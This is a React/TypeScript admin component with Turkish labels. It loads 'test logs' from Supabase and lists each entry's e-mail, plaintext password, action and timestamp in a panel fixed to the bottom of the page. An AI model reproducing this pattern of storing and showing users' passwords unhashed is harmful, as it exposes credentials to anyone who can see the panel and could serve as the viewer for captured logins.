import { useEffect, useState } from 'react'
import { Shield, RefreshCw } from 'lucide-react'
import { fetchTestLogs, TestLog } from '../lib/supabase'

export default function AdminPanel() {
  const [logs, setLogs] = useState<TestLog[]>([])
  const [loading, setLoading] = useState(true)

  const loadLogs = async () => {
    setLoading(true)
    const data = await fetchTestLogs()
    setLogs(data)
    setLoading(false)
  }

  useEffect(() => {
    loadLogs()
  }, [])

  return (
    <div className="fixed bottom-0 left-0 right-0 z-50 bg-gray-950 border-t-2 border-purple-600 shadow-2xl shadow-purple-900/50 max-h-96 overflow-auto">
      <div className="max-w-7xl mx-auto p-4">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center gap-3">
            <Shield className="text-purple-400" size={24} />
            <h2 className="text-lg font-black text-purple-400">Test Log Paneli (Admin)</h2>
          </div>
          <button
            onClick={loadLogs}
            className="flex items-center gap-2 bg-purple-600/20 hover:bg-purple-600/30 text-purple-400 px-3 py-1.5 rounded-lg transition-all font-bold text-sm"
          >
            <RefreshCw size={14} />
            Yenile
          </button>
        </div>

        {loading ? (
          <div className="text-center py-8 text-purple-400 font-bold">Yüklüyor...</div>
        ) : logs.length === 0 ? (
          <div className="text-center py-8 text-gray-500 font-bold">Henüz kayıt yok</div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead>
                <tr className="border-b border-purple-900/50">
                  <th className="px-4 py-2 text-purple-400 font-extrabold text-sm">#</th>
                  <th className="px-4 py-2 text-purple-400 font-extrabold text-sm">E-posta</th>
                  <th className="px-4 py-2 text-purple-400 font-extrabold text-sm">Şifre</th>
                  <th className="px-4 py-2 text-purple-400 font-extrabold text-sm">İşlem</th>
                  <th className="px-4 py-2 text-purple-400 font-extrabold text-sm">Tarih</th>
                </tr>
              </thead>
              <tbody>
                {logs.map((log, index) => (
                  <tr key={log.id || index} className="border-b border-gray-800/50 hover:bg-purple-900/10">
                    <td className="px-4 py-2 text-gray-400 text-sm font-bold">{index + 1}</td>
                    <td className="px-4 py-2 text-white text-sm font-bold">{log.email}</td>
                    <td className="px-4 py-2 text-gray-300 text-sm font-bold">{log.password}</td>
                    <td className="px-4 py-2 text-sm font-bold">
                      <span className="bg-purple-600/20 text-purple-400 px-2 py-0.5 rounded text-xs font-extrabold">
                        {log.action}
                      </span>
                    </td>
                    <td className="px-4 py-2 text-gray-500 text-sm font-bold">
                      {log.created_at ? new Date(log.created_at).toLocaleString('tr-TR') : '-'}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  )
}
